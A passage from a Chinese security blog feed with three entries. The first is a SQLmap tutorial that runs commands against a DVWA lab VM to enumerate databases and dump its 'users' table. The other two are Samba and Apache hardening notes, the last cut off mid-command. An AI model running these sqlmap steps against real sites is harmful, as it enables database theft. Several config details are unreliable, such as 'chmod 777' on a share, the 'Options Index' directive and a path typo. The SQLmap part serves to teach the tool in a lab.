      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>此系列笔记是网络渗透工具的使用方法，本篇是介绍 SQL 注入工具 SQLmap 的使用方法。SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）<a id="more"></a></p><h1 id="SQLmap-环境"><a href="#SQLmap-环境" class="headerlink" title="SQLmap 环境"></a>SQLmap 环境</h1><blockquote><p>由于 <code>kali Liunx</code> 已经集成了 SQLmap 的环境，这里就直接介绍 <code>Windows</code> 下环境的构建。</p></blockquote><h2 id="先安装-Python"><a href="#先安装-Python" class="headerlink" title="先安装 Python"></a>先安装 Python</h2><p>正常情况下我们安装 <code>2.7.x</code> 就好了。</p><blockquote><p><a href="//www.python.org/getit/">Python 官网下载地址</a></p></blockquote><p>接下来只需在环境变量 <code>path</code> 中添加 Python 的安装路径就好了。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/sqlmap-1.png" alt="SQLmap"></p><h2 id="再安装-SQLmap"><a href="#再安装-SQLmap" class="headerlink" title="再安装 SQLmap"></a>再安装 SQLmap</h2><blockquote><p><a href="//sqlmap.org/">SQLmap 官网下载地址</a></p></blockquote><p>将 SQLmap 解压至 Python 目录下，将 SQLmap 的程序目录重命名为 sqlmap。</p><h3 id="在桌面新建快捷方式"><a href="#在桌面新建快捷方式" class="headerlink" title="在桌面新建快捷方式"></a>在桌面新建快捷方式</h3><p><code>For Example:</code></p><p><img src="http://oaq0p7t2g.bkt.clouddn.com/sqlmap-2.png" alt="SQLmap"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/sqlmap-3.png" alt="SQLmap"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/sqlmap-4.png" alt="SQLmap"></p><h1 id="DVWA-环境"><a href="#DVWA-环境" class="headerlink" title="DVWA 环境"></a>DVWA 环境</h1><p>DVWA(Dam Vulnerable Web Application) 使用 <code>PHP+Mysql</code> 编写的一套用于常规 WEB 漏洞教学和检测的 WEB 脆弱性测试程序。包含 SQL 注入、XSS、盲注等常见的一些漏洞。</p><blockquote><p><a href="//github.com/ethicalhack3r/DVWA">DVWA GitHub 下载地址</a></p></blockquote><p>在 <code>Windows</code> 下还需安装 <code>PHP</code> 环境，这里推介两个 <code>PHP</code> 集成环境。</p><blockquote><p><a href="//www.upupw.net/">upupw PHP 集成环境</a> <a href="//www.phpstudy.net/">phpStudy PHP 集成环境</a></p></blockquote><p>接下来只需修改一下配置文件就好了。</p><h1 id="SQlmap-使用方法"><a href="#SQlmap-使用方法" class="headerlink" title="SQlmap 使用方法"></a>SQlmap 使用方法</h1><p><code>Windows</code> 下跟 <code>kali Liunx</code> 下使用方法不相同。</p><p>为方便演示，我们创建两个虚拟机：</p><ul><li>受害者机器，<code>Windows 2003</code> 操作系统，运行一个 WEB 服务器，同时跑着一个包含漏洞的 WEB 应用（DVWA）。</li><li>攻击器机器，使用 <code>kali Liunx</code> 或者其他版本的 <code>Windows</code> 包含 SQLmap 程序。</li></ul><p>本次实验的目的：使用 SQLmap 得到以下信息：</p><ul><li>枚举 MYSQL 用户名与密码。</li><li>枚举所有数据库。</li><li>枚举指定数据库的数据表。</li><li>枚举指定数据表中的所有用户名与密码。</li></ul><h2 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h2><p><code>Windows：</code>查看 Python 帮助命令</p><pre><code class="bash">python sqlmap.py -h
</code></pre><p><code>kali Liunx：</code>查看 Python 帮助命令</p><pre><code class="bash">sqlmap -h
</code></pre><blockquote><p>需要注意的是 <code>Windows</code> 下的选项和 <code>kali Liunx</code> 下的选项是一致的，但是命令是不一致的。在 <code>Windows</code> 下使用 <code>python sqlmap.py</code>，而在 <code>kali Liunx</code> 下使用的是 <code>sqlmap</code>。</p></blockquote><h2 id="选项解释"><a href="#选项解释" class="headerlink" title="选项解释"></a>选项解释</h2><ul><li><strong>–cookie</strong> =&gt; 设置我们的 cookie 值 “将 DVWA 安全等级设置为 low”</li><li><strong>–data</strong> =&gt; 设置 POST 提交的值，如果是 GET 提交，不需要此选项</li><li><strong>-u</strong> =&gt; 指定目标 URL</li><li><strong>-b</strong> =&gt; 获取 DBMS banner</li><li><strong>–current-db</strong> =&gt; 获取当前数据库</li><li><strong>–current-user</strong> =&gt; 获取当前数据库的用户</li><li><strong>–tables</strong> =&gt; 获取数据库里所有的表名</li><li><strong>–columns</strong> =&gt; 获取表里的所有字段</li><li><strong>–dump</strong> =&gt; 获取值</li><li><strong>–current-user</strong> =&gt; 获取当前用户</li><li><strong>-D</strong> =&gt; 爆库指定数据库名</li><li><strong>-T</strong> =&gt; 爆库指定表名</li><li><strong>-C</strong> =&gt; 爆库指定字段名</li><li><strong>–string</strong> =&gt; 当查询可用时用来匹配页面中的字符串</li><li><strong>–users</strong> =&gt; 枚举 DBMS 用户</li><li><strong>–password</strong> =&gt; 枚举 DBMS 用户密码 hash</li><li><strong>–dbs</strong> =&gt; 枚举 DBMS 中的数据库</li></ul><h1 id="开始爆库"><a href="#开始爆库" class="headerlink" title="开始爆库"></a>开始爆库</h1><blockquote><p>由于 <code>Windows</code> 和 <code>kali Liunx</code> 的做法基本一致，这里以 <code>kali Liunx</code> 为例。DVWA 的难度为 low。</p></blockquote><h2 id="先获取-Cookie"><a href="#先获取-Cookie" class="headerlink" title="先获取 Cookie"></a>先获取 Cookie</h2><blockquote><p>每一次的 Cookie 都不一样，这里是个示范。</p></blockquote><p><code>For Example:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/sqlmap-5.png" alt="SQLmap"></p><h2 id="获取数据库，–current-db"><a href="#获取数据库，–current-db" class="headerlink" title="获取数据库，–current-db"></a>获取数据库，–current-db</h2><p><code>For Example:</code></p><pre><code class="bash">sqlmap -u &quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3; security=low&quot; --current-db
</code></pre><blockquote><p>URL 地址和 Cookie 请用真实的替换掉。这条命令可以把当前所有的数据库获取出来的。注意 <code>--current-db</code> 的 <code>-</code> 可是有两个的。</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/sqlmap-6.png" alt="SQLmap"></p><h2 id="获取表，–tables"><a href="#获取表，–tables" class="headerlink" title="获取表，–tables"></a>获取表，–tables</h2><blockquote><p>前面，我们已经获取到数据库名，这时候我们要指定数据库名。使用 <code>-D</code> 选项指定数据库名。注意 <code>--tables</code> 的 <code>-</code> 可是有两个的。</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">sqlmap -u &quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3; security=low&quot; -D &#39;dvwa&#39; --tables
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/sqlmap-7.png" alt="SQLmap"></p><h2 id="获取字段，–columns"><a href="#获取字段，–columns" class="headerlink" title="获取字段，–columns"></a>获取字段，–columns</h2><blockquote><p>前面，我们已经获取到数据库名和表名了，这时候我们要指定数据库名和表名。使用 <code>-D</code> 选项指定数据库名，使用 <code>-T</code> 指定表名。这里我们选择表 <code>users</code>。注意 <code>--columns</code> 的 <code>-</code> 可是有两个的。</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">sqlmap -u &quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3; security=low&quot; -D &#39;dvwa&#39; -T &#39;users&#39; --columns
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/sqlmap-8.png" alt="SQLmap"></p><h2 id="获取数据，–dump"><a href="#获取数据，–dump" class="headerlink" title="获取数据，–dump"></a>获取数据，–dump</h2><blockquote><p>前面，我们已经获取到数据库名、表名还有字段名了，这时候我们要指定数据库名、表名还有字段名。使用 <code>-D</code> 选项指定数据库名，使用 <code>-T</code> 指定表名，使用 <code>-C</code> 指定字段名。这里我们选择表 <code>users</code>中的字段 <code>user_id</code>。注意 <code>--dump</code> 的 <code>-</code> 可是有两个的。</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">sqlmap -u &quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3; security=low&quot; -D &#39;dvwa&#39; -T &#39;users&#39; -C &#39;user_id&#39; --dump
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/sqlmap-9.png" alt="SQLmap"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> pentest </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Pentest </tag>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 服务配置笔记（五）：SAMBA 服务安全配置]]></title>
      <url>/2016/09/liunx-service-samba/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本篇是 Liunx 的服务配置笔记系列第五篇，这一篇将具体介绍 Red Hat Liunx 下 SAMBA 服务的安全配置。所谓 SAMBA 就是建立 Liunx 和 Windows 之间的共享，使 Windows 能够访问 Liunx 下共享出来的文件<a id="more"></a></p><h1 id="配置文件的位置"><a href="#配置文件的位置" class="headerlink" title="配置文件的位置"></a>配置文件的位置</h1><p>主配置文件：<strong>/etc/samba/smb.conf</strong></p><h1 id="服务的启动与停止"><a href="#服务的启动与停止" class="headerlink" title="服务的启动与停止"></a>服务的启动与停止</h1><blockquote><p>SAMBA 的服务名并不叫做 <code>samba</code>，而是 <code>smb</code>。<br><br>修改配置文件过后一定要重启 <code>smb</code> 服务。</p></blockquote><pre><code class="bash">service smb status        # 状态
service smb start         # 启动
service smb stop          # 暂停
service smb restart       # 重启
</code></pre><h1 id="服务的安装"><a href="#服务的安装" class="headerlink" title="服务的安装"></a>服务的安装</h1><h2 id="创建挂载目录"><a href="#创建挂载目录" class="headerlink" title="创建挂载目录"></a>创建挂载目录</h2><p><code>For Example:</code></p><pre><code class="bash">mkdir -p /mnt/cdrom
</code></pre><h2 id="挂在光盘"><a href="#挂在光盘" class="headerlink" title="挂在光盘"></a>挂在光盘</h2><p><code>For Example:</code></p><pre><code class="bash">mount /dev/cdrom /mnt/cdrom
</code></pre><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>For Example:</code></p><pre><code class="bash">cd /mnt/cdrom/Server
rpm -ivh perl-Convert-ASN1-0.20-1.1.noarch.rpm
rpm -ivh samba-3.0.33-3.28.el5.i386.rpm
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-samba-1.png" alt="SAMBA 服务安全配置"></p><h1 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h1><h2 id="配置工作组和-NetBIOS-名字"><a href="#配置工作组和-NetBIOS-名字" class="headerlink" title="配置工作组和 NetBIOS 名字"></a>配置工作组和 NetBIOS 名字</h2><p><code>Default Configuration:</code></p><pre><code class="bash">workgroup = MYGROUP
;netbios name = MYSERVER
</code></pre><blockquote><p>该文件默认配置的工作组是 MYGROUP，而 Windows 下的工作组默认为 WORKGROUP，Liunx 和 Windows 的工作组一定要一样，才能访问共享的文件。<br><br>该文件默认将 NetBIOS 的名字注释掉了，NetBIOS 名字就是会在 Windows 下的网上邻居能够看到的名字，注释掉就是会看不到，建议去掉注释。</p></blockquote><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-samba-2.png" alt="SAMBA 服务安全配置"></p><h2 id="配置安全级别"><a href="#配置安全级别" class="headerlink" title="配置安全级别"></a>配置安全级别</h2><p><code>Default Configuration:</code></p><pre><code class="bash">security = user
</code></pre><blockquote><p>默认的配置是 <code>user</code> 模式，在该模式下，Windows 下访问 SAMBA 需要用户名和密码，还可以设置的选项还有 <code>share/user/server/domain/ads</code>。可以根据需求修改此选项。</p></blockquote><ul><li><strong>share</strong>: 访问 Samba 服务器共享资源时不需要输入用户名和密码，属于匿名访问。</li><li><strong>user</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码，认证用户来源为 Samba 服务器本机。</li><li><strong>server</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码，认证用户来源为另一台 Samba 服务器或 Windows 服务器。</li><li><strong>domain</strong>: Samba 服务器在一个基于 Windows NT 平台的 Windows 域中，访问共享资源需要输入用户名和密码，认证用户来源为 Windows 域。</li><li><strong>ads</strong>: Samba 服务器在一个基于 Windows 200X 平台的 Windows 活动目录中，访问共享资源需要输入用户名和密码，认证用户来源为 Windows 活动目录。</li></ul><h2 id="配置认证密码在传输过程中加密"><a href="#配置认证密码在传输过程中加密" class="headerlink" title="配置认证密码在传输过程中加密"></a>配置认证密码在传输过程中加密</h2><blockquote><p>在默认的配置文件中没有此选项，可以手动添加，正常情况下是需要开启的。</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">encrypt passwords = yes
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-samba-3.png" alt="SAMBA 服务安全配置"></p><h2 id="配置用户密码的存储方式"><a href="#配置用户密码的存储方式" class="headerlink" title="配置用户密码的存储方式"></a>配置用户密码的存储方式</h2><p><code>Default Configuration:</code></p><pre><code class="bash">passdb backend = tdbsam
</code></pre><blockquote><p>默认的配置为 <code>tdbsam</code>，配置这个选项就是需要 <code>smbpasswd -a [userName]</code> 来建立 Samba 用户。还可以配置项为 <code>tdbsam/smbpasswd/ldapsam/mysql</code>。可以根据需求进行修改。</p></blockquote><ul><li><strong>tdbsam</strong>: 该方式使用一个数据库文件来建立用户数据库，数据库文件名为 passdb.tdb 。可以使用 smbpasswd -a [用户名] 来建立 Samba 用户。也可以使用 pdbedit 命令来建立用户。</li><li><strong>smbpasswd</strong>: 该方式使用 Samba 提供的工具 smbpasswd 来给系统用户设置一个用于访问 Samba 服务的密码，客户端就用这个密码访问 Samba 共享资源。此方式还要使用一个 smb passwd file = /usr/local/samba/etc/smbpasswd（或 /etc/samba/smbpasswd） 参数来指定保存用户名和密码的文件，该文件需要手动建立。不推荐使用此方法。</li><li><strong>ldapsam</strong>: 该方式基于 LADP 的账户管理方式来验证用户，先要建立 LDAP服务。</li><li><strong>mysql</strong>: 该方式是将 Samba 服务器的用户名和密码存储到 MySQL 数据库中。</li></ul><p><code>Example Configuration:</code></p><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-samba-4.png" alt="SAMBA 服务安全配置"></p><h2 id="设置白名单"><a href="#设置白名单" class="headerlink" title="设置白名单"></a>设置白名单</h2><p><code>Default Configuration:</code></p><pre><code class="bash">;hosts allow = 127\. 192.168.12\. 192.168.13.
</code></pre><blockquote><p>默认的配置是将白名单进行注释掉的，这里需要注意的是，可以配置一个具体的 IP 地址，也可以配置一个 IP 地址段，在配置 IP 地址段的时候要注意最后一个 <code>.</code> 不要忘了写。如默认配置中的 <code>127.</code> 就是规定 <code>127.0.0.1 ～ 127.255.255.254</code> 这个 IP 地址段可以进行访问，具体的 IP 地址不需要最后的 <code>.</code>.</p></blockquote><p><code>For Example:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-samba-5.png" alt="SAMBA 服务安全配置"></p><h2 id="单目录限定用户访问，禁止写入文件"><a href="#单目录限定用户访问，禁止写入文件" class="headerlink" title="单目录限定用户访问，禁止写入文件"></a>单目录限定用户访问，禁止写入文件</h2><p><code>For Example:</code></p><pre><code class="bash">[test]                    # 共享目录的名字
  comment = test          # 描述信息
  path = /home/test       # 共享目录路径
  browseable = yes        # 是否允许浏览
  writable = no           # 是否允许用户写入或者创建文件
  guest ok = no           # 是否允许 guest 用户访问
  valid users = sx
  # 白名单，指定能够进入此资源目录的特定用户，使用逗号隔开，如果是组的话，使用 @ 指明
</code></pre><p>另外还可以配置以下参数</p><ul><li><strong>read only</strong> =&gt; 设置是否只读，<code>yes/no</code></li><li><strong>public</strong> =&gt; 设置是否让所有可以登录的用户看到这个项目</li><li><strong>create mode</strong> =&gt; 指明新建立的文件的属性，一般是 <code>0755</code>。</li><li><strong>directory mode</strong> =&gt; 指明新建立的目录的属性，一般是 <code>0755</code>。</li></ul><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-samba-6.png" alt="SAMBA 服务安全配置"></p><h2 id="创建共享目录，设置权限"><a href="#创建共享目录，设置权限" class="headerlink" title="创建共享目录，设置权限"></a>创建共享目录，设置权限</h2><p><code>For Example:</code></p><pre><code class="bash">mkdir /hoem/test
chmod 777 /home/test
</code></pre><blockquote><p>注意共享目录一定要有执行权限，一般 <code>755</code> 就够了，这里设置 <code>777</code> 就是权限大一点就是了。</p></blockquote><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-samba-7.png" alt="SAMBA 服务安全配置"></p><h2 id="添加-SAMBA-用户"><a href="#添加-SAMBA-用户" class="headerlink" title="添加 SAMBA 用户"></a>添加 SAMBA 用户</h2><p><code>For Example:</code></p><pre><code class="bash">useradd zc
useradd sx
smbpasswd -a zc
smbpasswd -a sx
</code></pre><blockquote><p>这里需要注意的是，要使用 <code>smbpasswd -a</code> 创建用户，因为之前设置了用户密码的存储方式为 <code>tdbsam</code>。</p></blockquote><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-samba-8.png" alt="SAMBA 服务安全配置"></p><h2 id="使用-windows-访问"><a href="#使用-windows-访问" class="headerlink" title="使用 windows 访问"></a>使用 windows 访问</h2><p><code>For Example:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-samba-9.png" alt="SAMBA 服务安全配置"></p><blockquote><p>输入用户名和密码，就可以愉快的进行测试了，这里就不多说了。</p></blockquote><h2 id="使用-smbclient-访问"><a href="#使用-smbclient-访问" class="headerlink" title="使用 smbclient 访问"></a>使用 smbclient 访问</h2><h3 id="列出共享文件夹"><a href="#列出共享文件夹" class="headerlink" title="列出共享文件夹"></a>列出共享文件夹</h3><blockquote><p>列出某个IP地址所提供的共享文件夹</p></blockquote><p><code>Connect Format:</code></p><pre><code class="bash">smbclient -L [ip] -U [userName]%[password]
</code></pre><h3 id="像-FTP-客户端一样使用-smbclient"><a href="#像-FTP-客户端一样使用-smbclient" class="headerlink" title="像 FTP 客户端一样使用 smbclient"></a>像 FTP 客户端一样使用 smbclient</h3><blockquote><p>执行 smbclient 命令成功后，进入 smbclient 环境，出现提示符： <code>smb:\&gt;</code> 这里有许多命令和 ftp 命令相似，如 <code>cd</code>、<code>lcd</code>、<code>get</code>、<code>megt</code>、<code>put</code>、<code>mput</code> 等。通过这些命令，我们可以访问远程主机的共享资源。</p></blockquote><p><code>Connect Format:</code></p><pre><code class="bash">smbclient //[ip]/[shareFolder] -U [username]%[password]
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Protocol </tag>
            
            <tag> Service </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 服务配置笔记（四）：APACHE 服务安全配置]]></title>
      <url>/2016/09/liunx-service-apache/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本篇是 Liunx 的服务配置笔记系列第四篇，这一篇将具体介绍 Red Hat Liunx 下 APACHE 服务的安全配置。所谓 APACHE 就是一个 WEB 服务器，为 WEB 网页提供服务<a id="more"></a></p><h1 id="配置文件的位置"><a href="#配置文件的位置" class="headerlink" title="配置文件的位置"></a>配置文件的位置</h1><p>主配置文件：<strong>/etc/httpd/conf/httpd.conf</strong></p><h1 id="服务的启动与停止"><a href="#服务的启动与停止" class="headerlink" title="服务的启动与停止"></a>服务的启动与停止</h1><blockquote><p>APACHE 的服务名并不叫做 <code>http</code>，而是 <code>httpd</code>。<br><br>修改配置文件过后一定要重启 <code>httpd</code> 服务。</p></blockquote><pre><code class="bash">service httpd status        # 状态
service httpd start         # 启动
service httpd stop          # 暂停
service httpd restart       # 重启
</code></pre><h1 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h1><h2 id="修改网站的根目录"><a href="#修改网站的根目录" class="headerlink" title="修改网站的根目录"></a>修改网站的根目录</h2><p><code>Default Configuration:</code></p><pre><code class="bash">DocumentRoot &quot;/var/www/html&quot;
&lt;Directory &quot;/var/www/html&quot;&gt;
</code></pre><blockquote><p>APACHE 默认配置的网站根目录是在 <code>/var/www/html</code> 下，我们可以根据需求修改它。修改这个配置项的时候，还需同时修改 <code>&lt;Directory &quot;/var/www/html&quot;&gt;</code> 这个配置项。</p></blockquote><p>修改主配置文件，<code>Example Configuration:</code></p><pre><code class="bash">DocumentRoot &quot;/mnt/www&quot;
&lt;Directory &quot;/mnt/www/&quot;&gt;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-1.png" alt="APACHE 服务安全配置"></p><h3 id="使用客户端进行验证"><a href="#使用客户端进行验证" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。使用浏览器打开即可。</p></blockquote><p>验证之前，还需创建网站存放的目录，然后在创建一个测试的网页进行测试。</p><p><code>For Example:</code></p><pre><code class="bash">mkdir /mnt/www/
echo &quot;this is test.&quot; &gt;&gt; /mnt/www/index.html
</code></pre><p>接下来，在浏览器里输入你的服务器的 <code>IP</code> 地址就可以访问了。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-2.png" alt="APACHE 服务安全配置"></p><h2 id="配置目录的别名"><a href="#配置目录的别名" class="headerlink" title="配置目录的别名"></a>配置目录的别名</h2><p>修改主配置文件，<code>Example Configuration:</code></p><blockquote><p>目录别名设置，就是浏览器访问 <code>//[host]/test</code> 时，实际上访问的是 <code>/var/www/html/test</code> 目录。</p></blockquote><pre><code class="bash">Alias /test &quot;/var/www/html/test&quot;

&lt;Directory&gt;
  Options Indexes
  Order allow,deny
  allow from all
&lt;/Directory&gt;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-3.png" alt="APACHE 服务安全配置"></p><h3 id="使用客户端进行验证-1"><a href="#使用客户端进行验证-1" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。使用浏览器打开即可。这时候就需要跟上目录名了。</p></blockquote><p>验证之前，还需要创建测试目录和测试网站文件。</p><p><code>For Example:</code></p><pre><code class="bash">mkdir /var/www/html/test
echo &quot;dir dir dir dir.&quot; &gt;&gt; /var/www/html/index.html
</code></pre><p>接下来，在浏览器里输入 <code>IP/test</code> 就可以访问了。注意大小写敏感。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-4.png" alt="APACHE 服务安全配置"></p><h2 id="关闭版本信息的显示"><a href="#关闭版本信息的显示" class="headerlink" title="关闭版本信息的显示"></a>关闭版本信息的显示</h2><p><code>Default Configuration:</code></p><pre><code class="bash">ServerSignature On
</code></pre><blockquote><p>如果你访问一个不存在的目录，默认是会显示 APACHE 的版本信息，这是很不安全的，建议关掉，注意大小写敏感。还可以设置为 <code>Off</code> 和 <code>EMail</code>。其中 <code>Off</code> 是隐藏信息，<code>EMail</code> 是会显示管理员的 email 信息的。</p></blockquote><p>修改主配置文件，<code>Example Configuration:</code></p><pre><code class="bash">ServerSignature Off
</code></pre><h3 id="使用客户端进行验证-2"><a href="#使用客户端进行验证-2" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>先看一下，没有进行修改之前会显示什么吧！随便写一个目录，访问它吧！</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-5.png" alt="APACHE 服务安全配置"></p><blockquote><p>修改好配置之后，重新访问，再次看一下有没有吧！</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-6.png" alt="APACHE 服务安全配置"></p><h2 id="禁用目录浏览、符号连接追踪"><a href="#禁用目录浏览、符号连接追踪" class="headerlink" title="禁用目录浏览、符号连接追踪"></a>禁用目录浏览、符号连接追踪</h2><p><code>Default Configuration:</code></p><pre><code class="bash">&lt;Directory &quot;/var/www/html&quot;&gt;
  Options Index FollowSymLinks
  AllowOverride None
  Order allow,deny
  Allow from all
&lt;/Directory&gt;
</code></pre><blockquote><p><code>Index</code> 是定义是否开启目录浏览，默认开启，要关闭只需添加 <code>-</code>；<code>FollowSymLinks</code> 是定义是否符号连接追踪，默认开启，要关闭只需添加 <code>-</code>。</p></blockquote><p>修改主配置文件，<code>Example Configuration:</code></p><blockquote><p>由于之前修改过网站根目录，所以在这里直接使用。</p></blockquote><pre><code class="bash">&lt;Directory &quot;/mnt/html&quot;&gt;
  Options -Index -FollowSymLinks
  AllowOverride None
  Order allow,deny
  Allow from all
&lt;/Directory&gt;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-7.png" alt="APACHE 服务安全配置"></p><h3 id="使用客户端进行验证-3"><a href="#使用客户端进行验证-3" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>配置禁用目录浏览，说白了就是当一个目录下没有类似于 <code>index.php</code> 、 <code>index.html</code>、<code>default.php</code>、<code>defaule.html</code> 等这样子的主页，APACHE 默认会把该目录下的目录结构给列出来，禁用就是阻止其列出。<br><br>配置禁用符号连接追踪，说白了就是防止某个用户偶然创建的一个符号连接指向文件爱呢系统的某一部分。<br><br>配置白名单，其实就是限制一些 IP 地址，让其不能访问 APACHE。<br><br>这些配置，在实际使用的过程中才会有体会，这里就不再进行测试了。</p></blockquote><h2 id="开启白名单"><a href="#开启白名单" class="headerlink" title="开启白名单"></a>开启白名单</h2><p><code>Default Configuration:</code></p><pre><code class="bash">&lt;Directory &quot;/var/www/html&quot;&gt;
  Options Index FollowSymLinks
  AllowOverride None
  Order allow,deny
  Allow from all
&lt;/Directory&gt;
</code></pre><blockquote><p>直接修改 <code>Allow from</code> 这一项，<code>Allow from</code> 是定义白名单，默认是允许所有 IP 地址访问，要限制只需把 <code>all</code> 替换成允许访问的 IP 地址就好。</p></blockquote><p>修改主配置文件，<code>Example Configuration:</code></p><pre><code class="bash">&lt;Directory &quot;/mnt/html&quot;&gt;
  Options -Index -FollowSymLinks
  AllowOverride None
  Order allow,deny
  Allow from 192.168.1.0/24
&lt;/Directory&gt;
</code></pre><h2 id="限制-http-请求包上限"><a href="#限制-http-请求包上限" class="headerlink" title="限制 http 请求包上限"></a>限制 http 请求包上限</h2><blockquote><p>HTTP 协议包包含请求包和应答包。HTTP 请求包(GET、POST 等请求方法)由三个部分构成，分别是：<code>方法-URI-协议/版本</code>，请求头即请求正文；HTTP 应答包和 HTTP 请求包相似，由三个部分构成，分别是：<code>协议-状态代码-描述</code>，应答头即应答正文。</p></blockquote><h3 id="LimitRequestLine-指令"><a href="#LimitRequestLine-指令" class="headerlink" title="LimitRequestLine 指令"></a>LimitRequestLine 指令</h3><blockquote><p>设置 HTTP 请求行的字节数限制。</p></blockquote><p>LimitRequestLine 指令允许服务器管理员增加或减少客户端 HTTP 请求行允许大小的限制。因为请求行包括 HTTP 方法、URI、协议版本，所以 LimitRequestLine 指令会限制请求 URI 的长度。服务器会需要这个值足够大以装载它所有的资源名，包括可能在 GET 请求中所传递的查询部分的所有信息。</p><p>这个指令给了服务器管理员更大的可控性以控制客户端不正常的请求行为。这有助于避免某些形式的拒绝服务攻击。</p><h3 id="LimitRequestFieldSize-指令"><a href="#LimitRequestFieldSize-指令" class="headerlink" title="LimitRequestFieldSize 指令"></a>LimitRequestFieldSize 指令</h3><blockquote><p>指定 HTTP 请求头允许的字节大小。</p></blockquote><p>LimitRequestFieldSize 指令允许服务器管理员增加或减少 HTTP 请求头域大小的限制。一般来说，服务器需要此值足够大，以适应普通客户端的任何请求的头域大小。一个普通头域的大小对于不同的客户端来说是有很大差别的，一般与用户配置他们的浏览器以支持更多的内容协议密切相关。SPNEGO 的认证头最大可能达到 12392 字节。</p><p>这个指令给了服务器管理员更大的可控性以控制客户端不正常的请求行为。这有助于避免某些形式的拒绝服务攻击。</p><h3 id="示例配置"><a href="#示例配置" class="headerlink" title="示例配置"></a>示例配置</h3><blockquote><p>默认配置中是没有 LimitRequestLine 指令和 LimitRequestFieldSize 指令，需要手动添加</p></blockquote><p><code>Example Configuration:</code></p><pre><code class="bash">LimitRequestLine 1024k
LimitRequestFieldSize 1024k
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-15.png" alt="APACHE 服务安全配置"></p><h2 id="配置-https"><a href="#配置-https" class="headerlink" title="配置 https"></a>配置 https</h2><blockquote><p>HTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议要比 http 协议安全。</p></blockquote><h3 id="生成证书和密钥"><a href="#生成证书和密钥" class="headerlink" title="生成证书和密钥"></a>生成证书和密钥</h3><h4 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h4><pre><code class="bash">openssl genrsa 1024 &gt; server.key
